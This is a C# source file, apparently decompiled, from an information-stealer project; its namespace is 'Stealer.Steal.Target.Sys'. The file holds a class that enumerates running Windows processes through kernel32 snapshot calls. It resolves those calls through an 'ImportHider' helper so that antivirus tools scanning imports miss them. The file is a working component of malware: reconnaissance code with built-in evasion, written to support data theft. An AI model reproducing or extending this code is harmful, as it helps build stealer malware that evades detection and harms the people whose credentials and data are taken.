using System;
using System.Collections.Generic;
using System.Runtime.InteropServices;
using Stealer.Steal.Helper;

namespace Stealer.Steal.Target.Sys;

internal class ProcessDump
{
	public struct PROCESSENTRY32
	{
		public uint dwSize;

		public uint cntUsage;

		public uint th32ProcessID;

		public IntPtr th32DefaultHeapID;

		public uint th32ModuleID;

		public uint cntThreads;

		public uint th32ParentProcessID;

		public int pcPriClassBase;

		public uint dwFlags;

		[MarshalAs(UnmanagedType.ByValTStr, SizeConst = 260)]
		public string szExeFile;
	}

	private delegate IntPtr CreateToolhelp32Snapshot(uint dwFlags, uint th32ProcessID);

	private delegate bool Process32First(IntPtr hSnapshot, ref PROCESSENTRY32 lppe);

	private delegate bool Process32Next(IntPtr hSnapshot, ref PROCESSENTRY32 lppe);

	private delegate bool CloseHandle(IntPtr handle);

	public static PROCESSENTRY32[] Dump()
	{
		CreateToolhelp32Snapshot createToolhelp32Snapshot = ImportHider.HiddenCallResolve<CreateToolhelp32Snapshot>("kernel32.dll", "CreateToolhelp32Snapshot");
		Process32First process32First = ImportHider.HiddenCallResolve<Process32First>("kernel32.dll", "Process32First");
		Process32First process32First2 = ImportHider.HiddenCallResolve<Process32First>("kernel32.dll", "Process32Next");
		CloseHandle closeHandle = ImportHider.HiddenCallResolve<CloseHandle>("kernel32.dll", "CloseHandle");
		List<PROCESSENTRY32> list = new List<PROCESSENTRY32>();
		IntPtr intPtr = createToolhelp32Snapshot(2u, 0u);
		PROCESSENTRY32 lppe = default(PROCESSENTRY32);
		lppe.dwSize = (uint)Marshal.SizeOf(typeof(PROCESSENTRY32));
		if (process32First(intPtr, ref lppe))
		{
			do
			{
				try
				{
					if (!string.IsNullOrEmpty(lppe.szExeFile))
					{
						list.Add(lppe);
					}
				}
				catch
				{
				}
			}
			while (process32First2(intPtr, ref lppe));
		}
		closeHandle(intPtr);
		return list.ToArray();
	}
}
